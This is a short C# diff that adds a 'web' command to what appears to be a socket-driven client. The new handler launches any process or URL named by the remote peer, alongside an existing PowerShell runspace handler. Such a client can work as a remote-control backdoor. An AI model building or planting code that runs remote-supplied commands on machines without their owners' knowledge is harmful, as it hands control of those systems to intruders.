@@ -75,6 +75,18 @@ public class Program
                     Console.WriteLine("couldn't open process");
                 }
             }
+            else if (data[0].ToLower().Equals("web"))
+            {
+                try
+                {
+                    System.Diagnostics.Process.Start(data[1]);
+                }
+                catch (Exception e)
+                {
+                    ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes("false"), 0, System.Text.Encoding.ASCII.GetBytes("false").Length, SocketFlags.None);
+                    Console.WriteLine("couldn't open process");
+                }
+            }
             else if (data[0].ToLower().Equals("powershell"))
             {
                 // create Powershell runspace
